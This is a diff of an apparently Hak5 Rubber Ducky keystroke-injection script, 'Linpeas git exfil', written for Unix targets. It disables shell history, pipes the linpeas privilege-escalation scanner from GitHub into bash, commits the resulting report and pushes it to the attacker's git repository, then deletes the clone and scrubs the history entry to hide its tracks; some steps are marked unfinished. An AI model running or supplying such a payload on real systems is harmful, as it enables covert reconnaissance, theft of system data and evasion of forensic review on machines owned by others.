@@ -1,7 +1,51 @@
-REM FalsePhilospher
+REM Title: Linpeas git exfil
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Recon
+REM Launches Covers tracks, clones git repo as most organizations allow github, launches linpeas and uploads the report to your git repo. Best viewing of report is to view it in the terminal.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
 DELAY 300
 CTRL-ALT t
+REM adjust delay as needed
 DELAY 1500
-STRING curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >/tmp/quack.txt
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
+STRING set +o history
 DELAY 300
+ENTER
+REM check current git remote setting and back it up.
+STRING git remote get-url --push origin > git.txt
+DELAY 300
+ENTER
+DELAY
+REM set it to your repo now
+REM STRING git remote set-url origin https://"token"@github.com/"username"/"repoName".git
+DELAY 300
+ENTER
+STRING git clone "repo link" && cd "repo name"
+DELAY 300
+ENTER
+DELAY 300
+STRING nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && git add * && git commit -m "treasure waits" && git push
+DELAY 300
+CTRL c
+DELAY 300
+CTRL c
+REM i'm sure there's a better way to do that
+DELAY 300
+REM change the git remote setting back
+REM this is as far as I got an i'm stumped on how to restore it
+DELAY 300
+ENTER
+DELAY 300
+REM sneak +1 cover your tracks, delete repo, files and history
+DELAY 200
+ENTER
+STRING cd .. && rm -rf "repo name" && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history && exit
+DELAY 200
 ENTER
